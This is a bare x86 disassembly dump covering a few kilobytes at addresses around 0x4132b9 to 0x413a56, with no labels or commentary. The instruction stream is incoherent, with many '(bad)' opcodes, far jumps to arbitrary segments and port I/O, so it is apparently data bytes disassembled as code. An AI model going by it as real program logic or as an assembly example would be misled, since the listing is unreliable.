  4132b9:	add    BYTE PTR [esi],ch
  4132bb:	popa   
  4132bc:	popf   
  4132bd:	mov    ah,0x9d
  4132bf:	inc    esp
  4132c0:	push   ss
  4132c1:	add    BYTE PTR [eax],al
  4132c3:	add    ch,bh
  4132c5:	mov    al,dh
  4132c7:	add    BYTE PTR [eax],al
  4132c9:	int3   
  4132ca:	mov    ecx,0xd6860000
  4132cf:	dec    ecx
  4132d0:	les    ebx,FWORD PTR [eax+eax*1]
  4132d3:	add    al,cl
  4132d5:	hlt    
  4132d6:	add    BYTE PTR [eax],al
  4132d8:	and    al,0xce
  4132da:	adc    bl,BYTE PTR [ebx+0x65]
  4132dd:	stos   BYTE PTR es:[edi],al
  4132de:	or     BYTE PTR [edx+0x0],ch
  4132e1:	add    BYTE PTR [ebx+0x2a],bl
  4132e4:	loop   0x413334
  4132e6:	outs   dx,DWORD PTR ds:[esi]
  4132e7:	mov    DWORD PTR [esi],ecx
  4132e9:	jge    0x4132b7
  4132eb:	or     DWORD PTR [eax],eax
  4132ed:	add    dh,dh
  4132ef:	mov    WORD PTR [ebx+0x0],es
  4132f2:	add    BYTE PTR [esi-0x46],al
  4132f5:	push   ebx
  4132f6:	mov    bl,0x8
  4132f8:	test   DWORD PTR [eax],eax
  4132fa:	add    BYTE PTR [eax-0x21],bh
  4132fd:	(bad)  
  4132fe:	enter  0xae,0x0
  413302:	sbb    bh,BYTE PTR [ebp+0x3c21226d]
  413308:	scas   al,BYTE PTR es:[edi]
  413309:	push   edi
  41330a:	add    ebx,DWORD PTR [esi-0x43ffa731]
  413310:	add    BYTE PTR [eax],al
  413312:	push   ebx
  413313:	push   0x43b422a6
  413318:	cmp    esi,0x3ea00a2a
  41331e:	cwde   
  41331f:	mov    eax,ds:0x54cd7a72
  413324:	xchg   ebx,eax
  413325:	mov    ebx,0xc510d3a6
  41332a:	push   edi
  41332b:	cld    
  41332c:	(bad)  
  41332d:	mov    edi,0x3a08ca
  413332:	add    BYTE PTR [eax-0x4b],al
  413335:	add    BYTE PTR [eax],al
  413337:	inc    ecx
  413338:	push   edi
  413339:	stc    
  41333a:	pop    esp
  41333b:	push   cs
  41333c:	dec    esp
  41333d:	and    DWORD PTR [eax],eax
  41333f:	add    bh,dh
  413341:	je     0x4132e6
  413343:	pop    esi
  413344:	jl     0x4132e8
  413346:	jmp    0x4ae9:0xcf7a572b
  41334d:	pop    ebx
  41334e:	mov    WORD PTR [ebx-0x69b10000],gs
  413354:	xchg   edx,eax
  413355:	mov    fs,WORD PTR [edi+ebp*4+0x580575c9]
  41335c:	mov    edx,0x474afebf
  413361:	(bad)  
  413362:	and    DWORD PTR [ebx-0x63],esi
  413365:	cmp    DWORD PTR [ecx+0x490e1ee0],0x1583429d
  41336f:	stos   BYTE PTR es:[edi],al
  413370:	xchg   ebp,eax
  413371:	rol    esi,1
  413373:	pop    esi
  413374:	fimul  DWORD PTR [ebp-0x571b8642]
  41337a:	sbb    dl,BYTE PTR [edi-0xa]
  41337d:	fwait
  41337e:	aas    
  41337f:	test   BYTE PTR [ebp+0x3ff8db0d],0x74
  413386:	lock sahf 
  413388:	stc    
  413389:	pop    esp
  41338a:	fild   DWORD PTR [ebp+0x3a83fc2e]
  413390:	not    DWORD PTR [esi]
  413392:	(bad)  
  413393:	in     al,0x58
  413395:	inc    edx
  413396:	mov    esp,0x4b6df9da
  41339b:	call   0x868:0x4a2bec9c
  4133a2:	daa    
  4133a3:	add    BYTE PTR [eax],al
  4133a5:	sbb    ebp,DWORD PTR [ebx-0x32b96dec]
  4133ab:	mov    esp,0x8cb951af
  4133b0:	jnp    0x4133b2
  4133b2:	add    dh,bl
  4133b4:	cmp    esp,DWORD PTR [ebp+ecx*4+0x6c]
  4133b8:	clc    
  4133b9:	cmp    cl,BYTE PTR [ebp-0x1d]
  4133bc:	mov    ds:0x422d969a,eax
  4133c1:	cli    
  4133c2:	retf   0xfbc3
  4133c5:	aas    
  4133c6:	push   ecx
  4133c7:	cs adc esi,DWORD PTR ds:[ecx+0x4c87e160]
  4133cf:	fiadd  WORD PTR [eax]
  4133d1:	add    BYTE PTR [eax+0x3800008e],cl
  4133d7:	sbb    dl,BYTE PTR [ebx]
  4133d9:	in     al,0xec
  4133db:	xchg   ebp,eax
  4133dc:	mov    WORD PTR [ebp+0x0],ss
  4133df:	add    dh,ah
  4133e1:	mov    eax,DWORD PTR [edx+0x35]
  4133e4:	in     al,dx
  4133e5:	mov    dh,0x7b
  4133e7:	cmp    esp,0xffffffd1
  4133ea:	clc    
  4133eb:	sub    DWORD PTR [eax],eax
  4133ed:	sbb    al,BYTE PTR [eax]
  4133ef:	add    dl,bh
  4133f1:	xchg   esi,eax
  4133f2:	jbe    0x4133c2
  4133f4:	or     BYTE PTR [edx+0x0],ah
  4133f7:	add    BYTE PTR [edx+0x7aab3ed6],bl
  4133fd:	xor    al,0x56
  4133ff:	retf   0xb6e9
  413402:	cmp    cl,BYTE PTR [ecx]
  413404:	arpl   WORD PTR [eax-0x36ffff24],ax
  41340a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41340b:	sahf   
  41340c:	and    DWORD PTR [ebp-0x8df3154],esi
  413412:	pop    ss
  413413:	icebp  
  413414:	ja     0x413493
  413416:	xlat   BYTE PTR ds:[ebx]
  413417:	xchg   DWORD PTR [eax],ebp
  413419:	out    0x4,al
  41341b:	inc    BYTE PTR [eax]
  41341d:	add    al,bl
  41341f:	test   dh,0xdf
  413422:	pushf  
  413423:	mov    ds,WORD PTR [eax]
  413425:	xchg   edx,eax
  413426:	sbb    al,0xbe
  413428:	and    ecx,DWORD PTR [edx+0x4]
  41342b:	xchg   esi,eax
  41342c:	add    BYTE PTR [eax],al
  41342e:	ins    BYTE PTR es:[edi],dx
  41342f:	xchg   esi,eax
  413430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413431:	mov    cl,0xe9
  413433:	shl    BYTE PTR [ecx+0xf09959c],cl
  413439:	xor    BYTE PTR [ebp+0x0],0x0
  41343d:	push   ebp
  41343e:	jecxz  0x4133e2
  413440:	scas   al,BYTE PTR es:[edi]
  413441:	cmp    eax,0x6910f8cb
  413446:	xlat   BYTE PTR ds:[ebx]
  413447:	dec    ebx
  413448:	mov    cl,0xa1
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41344c:	lahf   
  41344d:	xchg   ebp,eax
  41344e:	xor    ebp,DWORD PTR [edx-0x78]
  413451:	call   0xfdf53456
  413456:	mov    al,0x13
  413458:	out    0xbb,eax
  41345a:	pop    esi
  41345b:	jmp    0x413417
  41345d:	cvttps2pi mm3,QWORD PTR [ecx]
  413460:	clc    
  413461:	je     0x4134a3
  413463:	push   ebp
  413464:	add    BYTE PTR [eax],al
  413466:	test   DWORD PTR [edi-0x66],eax
  413469:	xchg   ecx,eax
  41346a:	fldcw  WORD PTR [edi+0x3d]
  41346d:	out    0x86,al
  41346f:	or     eax,0xd358c5a1
  413474:	cmp    BYTE PTR [eax+0x6e],ch
  413477:	arpl   WORD PTR [eax-0x6e],bp
  41347a:	lock sahf 
  41347c:	xlat   BYTE PTR ds:[ebx]
  41347d:	ja     0x41348d
  41347f:	cmc    
  413480:	stos   BYTE PTR es:[edi],al
  413481:	nop
  413482:	jne    0x41341d
  413484:	mov    BYTE PTR [ebx+0x0],dh
  413487:	add    BYTE PTR ds:0xc25f93a2,dl
  41348d:	mov    dh,0xe
  41348f:	cmp    BYTE PTR [esi+ebp*1+0x6722c6e3],dh
  413496:	inc    ebx
  413497:	jo     0x41346d
  413499:	dec    edi
  41349a:	scas   al,BYTE PTR es:[edi]
  41349b:	pusha  
  41349c:	dec    esi
  41349d:	loopne 0x41347a
  41349f:	mov    al,ds:0x5b4cd9
  4134a4:	add    BYTE PTR [ecx],bl
  4134a6:	fisttp QWORD PTR [edx+0x2920a16a]
  4134ac:	or     BYTE PTR es:[ecx],bh
  4134af:	add    BYTE PTR [eax],al
  4134b1:	jmp    0x413523
  4134b3:	add    dh,BYTE PTR [ebx-0x7b]
  4134b6:	mov    ds:0x127d078e,al
  4134bb:	in     eax,dx
  4134bc:	sub    al,0x73
  4134be:	add    ebx,DWORD PTR [eax+0x3f71543a]
  4134c4:	loope  0x41350d
  4134c6:	ins    DWORD PTR es:[edi],dx
  4134c7:	add    DWORD PTR [ebx],ecx
  4134c9:	xor    esi,eax
  4134cb:	rol    BYTE PTR [edx],cl
  4134cd:	mov    ebp,0xd6cc25
  4134d2:	add    BYTE PTR [edi],al
  4134d4:	cld    
  4134d5:	xchg   esi,eax
  4134d6:	pop    edi
  4134d7:	stos   DWORD PTR es:[edi],eax
  4134d8:	mov    bh,0xdc
  4134da:	jp     0x41346c
  4134dc:	jnp    0x413512
  4134de:	sub    eax,0x181cfd0a
  4134e3:	xchg   esi,eax
  4134e4:	das    
  4134e5:	cmp    BYTE PTR [edx],bl
  4134e7:	or     BYTE PTR [eax+eax*1+0x627d3100],dh
  4134ee:	sbb    BYTE PTR ds:0x7b6aea43,dh
  4134f4:	push   edx
  4134f5:	call   0xaa2d:0x1a53e25e
  4134fc:	add    eax,0x422f341b
  413501:	(bad)  
  413502:	call   0x1bb9c372
  413507:	add    cl,BYTE PTR [eax+0x4900003b]
  41350d:	dec    esi
  41350e:	add    al,0x29
  413510:	add    BYTE PTR [eax],al
  413512:	sbb    edx,DWORD PTR [edi]
  413514:	cmp    eax,DWORD PTR [edx+0x786a098d]
  41351a:	inc    esp
  41351b:	rol    BYTE PTR [eax],cl
  41351d:	add    dh,bh
  41351f:	cmc    
  413520:	or     eax,edx
  413522:	or     al,BYTE PTR [ebp+0x7da82e7a]
  413528:	sbb    esi,DWORD PTR [bp+di]
  41352b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41352c:	cmp    eax,0xb973472a
  413531:	dec    ecx
  413532:	and    eax,0x4b5eea20
  413537:	mov    eax,0xc3b15d8b
  41353c:	sub    DWORD PTR [edx-0x15],ebp
  41353f:	aaa    
  413540:	add    al,0x13
  413542:	add    BYTE PTR [eax],al
  413544:	lods   eax,DWORD PTR ds:[esi]
  413545:	sub    ebp,ecx
  413547:	rol    DWORD PTR [edi+0x53],cl
  41354a:	xor    esi,esi
  41354c:	pop    ebp
  41354d:	in     al,dx
  41354e:	cmp    eax,0x4dc98da4
  413553:	fisub  DWORD PTR [eax+edx*4-0x66]
  413557:	mov    eax,0x53e6605d
  41355c:	xchg   esp,eax
  41355d:	aam    0xd6
  41355f:	nop
  413560:	xor    al,0xee
  413562:	fstp   TBYTE PTR [edi+0x4a]
  413565:	rol    BYTE PTR [ebp-0x63],1
  413568:	int3   
  413569:	into   
  41356a:	add    BYTE PTR [eax],al
  41356c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41356d:	cld    
  41356e:	jmp    0x4135c4
  413570:	stc    
  413571:	cld    
  413572:	out    0x1e,al
  413574:	xor    al,0x2
  413576:	pop    edx
  413577:	and    al,bl
  413579:	add    cl,al
  41357b:	add    BYTE PTR [eax],al
  41357d:	sbb    al,0x98
  41357f:	mov    edi,0x358424a7
  413584:	add    BYTE PTR [eax],al
  413586:	es aaa 
  413588:	add    DWORD PTR [ebx+0x111129cd],ebx
  41358e:	arpl   WORD PTR [edx+edi*8],dx
  413591:	xor    edx,DWORD PTR [edi+ebx*2+0x3815d061]
  413598:	inc    edx
  413599:	jg     0x41357a
  41359b:	adc    bl,dl
  41359d:	inc    edi
  41359e:	pop    ds
  41359f:	inc    edi
  4135a0:	dec    eax
  4135a1:	jl     0x4135a3
  4135a3:	add    BYTE PTR [edi-0x4c168b21],bh
  4135a9:	int3   
  4135aa:	dec    esp
  4135ab:	add    BYTE PTR [eax],al
  4135ad:	mov    eax,0x3089d2bb
  4135b2:	jge    0x4135a8
  4135b4:	xchg   ebx,eax
  4135b5:	xchg   BYTE PTR [ecx-0x14],bl
  4135b8:	sti    
  4135b9:	xor    cl,BYTE PTR [edx+edx*8]
  4135bc:	add    BYTE PTR [eax],al
  4135be:	std    
  4135bf:	sbb    ebx,DWORD PTR ds:0xc9cf2e62
  4135c5:	mov    edx,0x9988
  4135ca:	(bad)  
  4135cb:	jle    0x41362e
  4135cd:	add    DWORD PTR [edi-0xcbd2929],ebp
  4135d3:	mov    edi,0x5ee625d6
  4135d8:	jb     0x41355c
  4135da:	retf   0x8bb4
  4135dd:	ror    DWORD PTR [esi],0x5
  4135e0:	mov    edx,DWORD PTR [ebx+0x0]
  4135e3:	rol    BYTE PTR [eax],1
  4135e5:	add    BYTE PTR [ecx],al
  4135e7:	stos   BYTE PTR es:[edi],al
  4135e8:	shl    DWORD PTR [edx+0x9380bc],1
  4135ee:	add    bl,dl
  4135f0:	pop    ecx
  4135f1:	icebp  
  4135f2:	sbb    DWORD PTR [eax-0x61],ebx
  4135f5:	jnp    0x41357a
  4135f7:	pop    eax
  4135f8:	inc    esp
  4135f9:	push   edi
  4135fa:	add    BYTE PTR [eax],al
  4135fc:	out    0xf2,al
  4135fe:	mov    esp,0x82bee002
  413603:	clc    
  413604:	cs push edx
  413606:	dec    esp
  413607:	nop
  413608:	add    BYTE PTR [eax],al
  41360a:	jge    0x413680
  41360c:	xchg   ecx,eax
  41360d:	adc    al,0xda
  41360f:	mov    dh,0xaa
  413611:	jae    0x41361d
  413613:	and    dh,dh
  413615:	test   bh,dl
  413617:	add    BYTE PTR [eax],al
  413619:	js     0x41360e
  41361b:	mov    al,0x9d
  41361d:	outs   dx,BYTE PTR ds:[esi]
  41361e:	shl    BYTE PTR [esi-0x1a],cl
  413621:	test   eax,0xcb000099
  413627:	ss sub eax,0x3920eccd
  41362d:	inc    ebp
  41362e:	hlt    
  41362f:	cld    
  413630:	(bad)  
  413631:	leave  
  413632:	cmp    BYTE PTR [esi+0x51],al
  413635:	out    dx,al
  413636:	fldcw  WORD PTR [ebx-0x5f]
  413639:	cmp    ebx,DWORD PTR [ebx+0x576b5505]
  41363f:	push   ecx
  413640:	ds adc ah,ch
  413643:	(bad)  
  413644:	loopne 0x413646
  413646:	or     al,BYTE PTR [eax]
  413648:	add    BYTE PTR [edx+0x71],dh
  41364b:	repnz xlat BYTE PTR ds:[ebx]
  41364d:	adc    DWORD PTR [ecx-0x4b],ecx
  413650:	pushf  
  413651:	outs   dx,BYTE PTR ds:[esi]
  413652:	das    
  413653:	cmp    ch,BYTE PTR [edx+esi*1-0x7234b22]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	(bad)  
  41365c:	jmp    0x413601
  41365e:	cli    
  41365f:	mov    dh,0x15
  413661:	dec    ebx
  413662:	mov    al,ds:0xba5f164d
  413667:	sbb    eax,DWORD PTR [ebx+0x65300efc]
  41366d:	retf   
  41366e:	pop    ds
  41366f:	pop    ds
  413670:	(bad)  
  413672:	pop    esp
  413673:	mov    ds:0xf632648e,al
  413678:	cmp    ah,BYTE PTR ds:0x2c8051
  41367e:	add    BYTE PTR [ecx],al
  413680:	cdq    
  413681:	jb     0x41364c
  413683:	xlat   BYTE PTR ds:[ebx]
  413684:	cmp    BYTE PTR [ebx+eax*2-0x6a],0x5d
  413689:	push   eax
  41368a:	jmp    0x413684
  41368c:	into   
  41368d:	les    eax,FWORD PTR [ebp-0x3fac0000]
  413693:	adc    eax,DWORD PTR [eax]
  413695:	add    al,al
  413697:	inc    esp
  413698:	add    BYTE PTR [eax],al
  41369a:	fwait
  41369b:	jmp    0xaf72d675
  4136a0:	retf   
  4136a1:	out    0xe0,al
  4136a3:	scas   al,BYTE PTR es:[edi]
  4136a4:	add    al,0xd3
  4136a6:	add    BYTE PTR [eax],al
  4136a8:	dec    esp
  4136a9:	jno    0x4136ab
  4136ab:	add    dh,bh
  4136ad:	adc    al,0xf7
  4136af:	push   0xffffffb8
  4136b1:	pushf  
  4136b2:	test   eax,0x2a74750a
  4136b7:	lds    edx,FWORD PTR [ecx-0x1104f52e]
  4136bd:	dec    esp
  4136be:	data16 add BYTE PTR [eax],al
  4136c1:	out    dx,eax
  4136c2:	call   0x556dca6c
  4136c7:	mov    dl,0x19
  4136c9:	xchg   DWORD PTR [ecx+ebx*1+0x17780000],ecx
  4136d0:	push   edx
  4136d1:	hlt    
  4136d2:	mov    al,ds:0x410cdd
  4136d7:	add    BYTE PTR [edx+0x66],cl
  4136da:	or     BYTE PTR [edx+0x1d700000],dl
  4136e0:	js     0x41373a
  4136e2:	or     eax,0x72a0b30
  4136e7:	shl    DWORD PTR [ebx+esi*1-0xc],1
  4136eb:	add    dl,BYTE PTR [ebx+0x76]
  4136ee:	pop    ecx
  4136ef:	aad    0xf7
  4136f1:	out    dx,al
  4136f2:	jno    0x413748
  4136f4:	out    dx,al
  4136f5:	mov    ds:0xf7596a7a,eax
  4136fa:	xlat   BYTE PTR ds:[ebx]
  4136fb:	test   al,0xcb
  4136fd:	sbb    esi,ebp
  4136ff:	dec    edi
  413700:	mov    dh,0xe9
  413702:	xchg   esp,eax
  413703:	jno    0x4136cd
  413705:	into   
  413706:	add    BYTE PTR [eax],al
  413708:	or     dl,al
  41370a:	outs   dx,BYTE PTR ds:[esi]
  41370b:	push   ds
  41370c:	push   0xffffffb8
  41370e:	arpl   WORD PTR [ebx-0x41],di
  413711:	(bad)  
  413713:	out    0x1d,eax
  413715:	mov    ecx,0xdaf3056d
  41371a:	cli    
  41371b:	sub    bl,dh
  41371d:	and    eax,0xaae11b10
  413722:	dec    ecx
  413723:	push   0xffffffe4
  413725:	push   ecx
  413726:	xchg   ecx,eax
  413727:	and    al,0x94
  413729:	and    eax,0xce8a11c9
  41372e:	xchg   DWORD PTR [edi+0x73],ebx
  413731:	loope  0x41370f
  413733:	add    BYTE PTR [ebx-0x75ca0000],dh
  413739:	ins    BYTE PTR es:[edi],dx
  41373a:	push   esp
  41373b:	mov    al,ds:0xd6d3614b
  413740:	test   dh,bl
  413742:	add    BYTE PTR [eax],al
  413744:	dec    esi
  413745:	pop    es
  413746:	jmp    0xd00c195a
  41374b:	lods   eax,DWORD PTR ds:[esi]
  41374c:	sti    
  41374d:	lods   eax,DWORD PTR ds:[esi]
  41374e:	mov    al,0x19
  413750:	jge    0x41377f
  413752:	mov    esp,0x34de4992
  413757:	dec    edx
  413758:	inc    edi
  413759:	loopne 0x41370a
  41375b:	and    eax,edx
  41375d:	mov    bl,0x49
  41375f:	xchg   BYTE PTR [ebp+0x3a3aa0cd],cl
  413765:	imul   edi,DWORD PTR [edi+0x5410b120],0x5b
  41376c:	(bad)  
  41376d:	out    0x74,al
  41376f:	in     al,0x57
  413771:	mov    al,0x79
  413773:	xor    esp,DWORD PTR [esi]
  413775:	test   eax,0x3b88dcea
  41377a:	add    BYTE PTR [eax],al
  41377c:	dec    ebx
  41377d:	std    
  41377e:	ja     0x4137d6
  413780:	add    al,0xcc
  413782:	add    BYTE PTR [eax],al
  413784:	(bad)  
  413785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413786:	xchg   dh,bl
  413788:	sbb    DWORD PTR [edi],ebx
  41378a:	sbb    ah,al
  41378c:	fwait
  41378d:	inc    ebp
  41378e:	xchg   BYTE PTR [edi+0x4c4ad7ad],dh
  413794:	out    dx,eax
  413795:	add    BYTE PTR [eax],al
  413797:	fcomp  st(2)
  413799:	out    dx,eax
  41379a:	sub    edx,edx
  41379c:	mov    bh,0x30
  41379e:	inc    esi
  41379f:	in     al,dx
  4137a0:	inc    eax
  4137a1:	inc    ecx
  4137a2:	add    BYTE PTR [eax],al
  4137a4:	(bad)  
  4137a5:	outs   dx,DWORD PTR ds:[esi]
  4137a6:	or     eax,0x309ba8ef
  4137ab:	mov    WORD PTR [eax+0x0],ds
  4137ae:	add    ah,bl
  4137b0:	or     cl,bl
  4137b2:	jle    0x4137f1
  4137b4:	adc    ebx,DWORD PTR [ecx]
  4137b6:	sbb    bl,BYTE PTR [esi+0x6332ff7c]
  4137bc:	adc    al,0x13
  4137be:	mov    eax,0x302246b8
  4137c3:	push   esp
  4137c4:	jno    0x4137a6
  4137c6:	add    ah,dl
  4137c8:	add    BYTE PTR [eax],al
  4137ca:	not    BYTE PTR [edx]
  4137cc:	aam    0xb4
  4137ce:	mov    DWORD PTR [esi],edi
  4137d0:	add    BYTE PTR ds:0x389c0000,dh
  4137d6:	dec    ebp
  4137d7:	pop    edx
  4137d8:	jae    0x413809
  4137da:	and    BYTE PTR [ebp-0x39],ah
  4137dd:	test   eax,0x50a23dbc
  4137e2:	lahf   
  4137e3:	(bad)  
  4137e4:	mov    esp,0x2762ad50
  4137e9:	or     dl,bl
  4137eb:	cmp    edx,DWORD PTR [ecx]
  4137ed:	in     eax,0x9f
  4137ef:	mov    al,0xa9
  4137f1:	xchg   BYTE PTR [ebx-0x699cfa37],dh
  4137f7:	add    edx,DWORD PTR [ebx+0x445570dd]
  4137fd:	add    eax,DWORD PTR [eax]
  4137ff:	add    al,cl
  413801:	jmp    0x7b36:0x7e2e0000
  413808:	pop    eax
  413809:	sub    cl,dl
  41380b:	jnp    0x413819
  41380d:	add    BYTE PTR ss:[eax],al
  413810:	in     al,dx
  413811:	je     0x413883
  413813:	popf   
  413814:	inc    ecx
  413815:	jnp    0x41379d
  413817:	je     0x4137cb
  413819:	call   0x0:0x9cc0b022
  413820:	ror    al,0x0
  413823:	add    BYTE PTR [ecx-0x43],bh
  413826:	cli    
  413827:	pusha  
  413828:	fsub   DWORD PTR [eax-0x5e4e706a]
  41382e:	retf   
  41382f:	push   ss
  413830:	aaa    
  413831:	nop
  413832:	(bad)  
  413833:	push   edi
  413834:	xchg   edi,esp
  413836:	dec    ebx
  413837:	or     eax,0xc04471d1
  41383c:	add    BYTE PTR [eax],al
  41383e:	and    BYTE PTR [esi-0x944a8c1],cl
  413844:	inc    edi
  413845:	xor    eax,0x60544581
  41384a:	mov    dl,0xf8
  41384c:	mov    dl,0x5c
  41384e:	jb     0x41383f
  413850:	js     0x413831
  413852:	out    dx,al
  413853:	es cwde 
  413855:	cli    
  413856:	and    bl,0x20
  413859:	jp     0x413852
  41385b:	stos   DWORD PTR es:[edi],eax
  41385c:	jmp    0xe85a:0x90677564
  413863:	fidiv  WORD PTR [ebp+0x67]
  413866:	xchg   ebp,eax
  413867:	push   0xe34771bf
  41386c:	xor    DWORD PTR [edi+0x1b],edi
  41386f:	(bad)  
  413870:	and    eax,0xbf6298a5
  413875:	dec    ecx
  413876:	mov    dh,0xc6
  413878:	fldcw  WORD PTR [ebp+0x4643ca41]
  41387e:	shl    ecx,0x5e
  413881:	xor    cl,bh
  413883:	push   eax
  413884:	dec    edx
  413885:	neg    DWORD PTR [ebx+edi*8]
  413888:	cmp    al,BYTE PTR [ebp+ecx*2+0x0]
  41388c:	add    BYTE PTR [edx+0xd02ca30],dh
  413892:	enter  0x3d,0x0
  413896:	fwait
  413897:	imul   ebp,DWORD PTR [edi+eiz*4+0x74863930],0x4e
  41389f:	cmp    edx,DWORD PTR [esi+0x3b]
  4138a2:	mov    ecx,0xd955ef8a
  4138a7:	and    DWORD PTR [edi-0x21],0xffffffaa
  4138ab:	shl    DWORD PTR [edi-0x69e6daa1],0x55
  4138b2:	fidiv  DWORD PTR [eax-0x477cb646]
  4138b8:	int3   
  4138b9:	mov    eax,DWORD PTR [eax]
  4138bb:	add    BYTE PTR [edi+esi*2+0x10100000],al
  4138c2:	pop    ss
  4138c3:	add    ebx,DWORD PTR [ecx-0x49]
  4138c6:	mov    ds:0xe640dd0b,eax
  4138cb:	add    BYTE PTR [eax],al
  4138cd:	xor    al,0x4
  4138cf:	xlat   BYTE PTR ds:[ebx]
  4138d0:	add    BYTE PTR [eax],al
  4138d2:	dec    edx
  4138d3:	sbb    al,0x86
  4138d5:	add    BYTE PTR [ecx],ch
  4138d7:	add    BYTE PTR [eax],al
  4138d9:	mov    eax,0x2adf3260
  4138de:	xchg   esi,eax
  4138df:	xchg   ebp,eax
  4138e0:	pusha  
  4138e1:	call   0xac65cf86
  4138e6:	shr    BYTE PTR [ebp+0x68],cl
  4138e9:	dec    ebx
  4138ea:	push   0x7
  4138ec:	xchg   esi,eax
  4138ed:	aaa    
  4138ee:	lods   eax,DWORD PTR ds:[esi]
  4138ef:	xor    BYTE PTR [ebx+0x7e0f0000],0x6f
  4138f6:	aam    0xee
  4138f8:	fdivr  DWORD PTR [esp+ebp*8+0x58]
  4138fc:	call   0xed94420f
  413901:	jb     0x413981
  413903:	fnsetpm(287 only) 
  413905:	(bad)  
  413906:	repz add BYTE PTR [eax],al
  413909:	ret    0x2aa2
  41390c:	div    BYTE PTR [edi]
  41390e:	jle    0x4138e5
  413910:	jb     0x4138e0
  413912:	inc    esp
  413913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413914:	add    BYTE PTR [eax],al
  413916:	mov    BYTE PTR [ecx],dh
  413918:	add    BYTE PTR [eax],al
  41391a:	nop
  41391b:	mov    ebx,DWORD PTR ds:0x9e84
  413921:	push   ds
  413922:	dec    ecx
  413923:	sbb    bh,BYTE PTR [esi+0x66d0e592]
  413929:	adc    eax,0x7084
  41392e:	sbb    DWORD PTR ds:0x87b18fd6,0x7a7edc0e
  413938:	mov    ds,WORD PTR [eax]
  41393a:	retf   
  41393b:	mov    esi,0x7900ec
  413940:	add    BYTE PTR [esi+edx*1-0x3b],bh
  413944:	(bad)  [eax-0x56ffff17]
  41394a:	addr16 sub eax,0x54e363fe
  413950:	mov    ecx,0xa18c
  413955:	mov    bl,0x4d
  413957:	out    dx,eax
  413958:	ds test al,0xcc
  41395b:	xchg   esp,eax
  41395c:	add    BYTE PTR [eax],al
  41395e:	lds    ecx,FWORD PTR [esp+0x0]
  413962:	add    BYTE PTR [esp+eax*1-0x5d],bh
  413966:	add    BYTE PTR [eax],al
  413968:	fucomi st,st(0)
  41396a:	adc    dl,BYTE PTR [eax]
  41396c:	jge    0x4139cf
  41396e:	ret    
  41396f:	dec    edx
  413970:	jnp    0x413918
  413972:	adc    DWORD PTR [esi-0x7b980976],eax
  413978:	bound  eax,QWORD PTR [eax]
  41397a:	add    BYTE PTR [ecx],al
  41397c:	dec    edi
  41397d:	xchg   edi,eax
  41397e:	test   eax,0xb78bb985
  413983:	pop    ecx
  413984:	jmp    0x9b77:0xb218b8d6
  41398b:	cmp    edi,edi
  41398d:	(bad)  
  41398e:	xchg   edx,eax
  41398f:	and    ecx,DWORD PTR ds:0x7fc177d6
  413995:	mov    ebp,0x48ff06e3
  41399a:	cmp    eax,DWORD PTR [eax]
  41399c:	add    BYTE PTR [esi],dh
  41399e:	aas    
  41399f:	dec    ecx
  4139a0:	jo     0x4139dd
  4139a2:	test   eax,0x1ffb3738
  4139a7:	mov    esp,0x71891121
  4139ac:	mov    ch,bl
  4139ae:	dec    ebp
  4139af:	pop    eax
  4139b0:	mov    dl,0x76
  4139b2:	dec    eax
  4139b3:	add    al,BYTE PTR [eax]
  4139b5:	add    BYTE PTR [esi+0x65],dh
  4139b8:	scas   al,BYTE PTR es:[edi]
  4139b9:	ds jmp 0x413a23
  4139bc:	inc    ebx
  4139bd:	rcr    DWORD PTR [eax-0x34],1
  4139c0:	inc    edx
  4139c1:	add    BYTE PTR [eax],al
  4139c3:	sub    al,0x24
  4139c6:	enter  0xfd,0x0
  4139ca:	push   esi
  4139cb:	(bad)  
  4139cc:	jae    0x413a37
  4139ce:	pop    edi
  4139cf:	mov    dl,0x7a
  4139d1:	ficomp DWORD PTR ds:0x1281b7c7
  4139d7:	aas    
  4139d8:	popf   
  4139d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139db:	xlat   BYTE PTR ds:[ebx]
  4139dc:	xor    eax,0xdc134ea6
  4139e1:	add    al,bl
  4139e3:	pop    ss
  4139e4:	or     al,0x93
  4139e6:	add    BYTE PTR [eax],al
  4139e8:	popf   
  4139e9:	jmp    0x32974bfb
  4139ee:	es inc ebx
  4139f0:	xchg   ecx,eax
  4139f1:	(bad)  
  4139f3:	cld    
  4139f4:	and    ebp,ecx
  4139f6:	sbb    dh,BYTE PTR [edx]
  4139f8:	add    al,0xde
  4139fa:	add    BYTE PTR [eax],al
  4139fc:	and    al,0xc5
  4139fe:	xchg   DWORD PTR [ebx],esi
  413a00:	fs inc edi
  413a02:	pusha  
  413a03:	div    BYTE PTR [ecx]
  413a05:	dec    ebx
  413a06:	scas   al,BYTE PTR es:[edi]
  413a07:	call   0x6:0xcc642c5c
  413a0e:	add    BYTE PTR [esp+ebx*4-0x43],bl
  413a12:	cwde   
  413a13:	push   esi
  413a14:	jns    0x413a17
  413a16:	nop
  413a17:	add    eax,DWORD PTR [eax-0x7a]
  413a1a:	add    BYTE PTR [eax],al
  413a1c:	fimul  DWORD PTR [ebp+eax*1+0x43160000]
  413a23:	jmp    0x4139b3
  413a25:	sbb    dl,ch
  413a27:	jle    0x413a46
  413a29:	leave  
  413a2a:	jno    0x413a38
  413a2c:	adc    DWORD PTR [eax],eax
  413a2e:	add    ch,bh
  413a30:	and    ebp,esp
  413a32:	clc    
  413a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a34:	xor    al,0xa
  413a36:	ja     0x4139fb
  413a38:	into   
  413a39:	test   BYTE PTR [edi+0x3a200000],bl
  413a3f:	into   
  413a40:	sub    BYTE PTR [ecx-0x6b],ch
  413a43:	pop    es
  413a44:	add    bl,BYTE PTR cs:[ebx]
  413a47:	push   es
  413a48:	mov    ah,0x23
  413a4a:	retf   
  413a4b:	cli    
  413a4c:	fistp  WORD PTR [ebp-0x1c]
  413a4f:	inc    edi
  413a50:	test   BYTE PTR [ebp+0x4f520000],bh
  413a56:	(bad)  
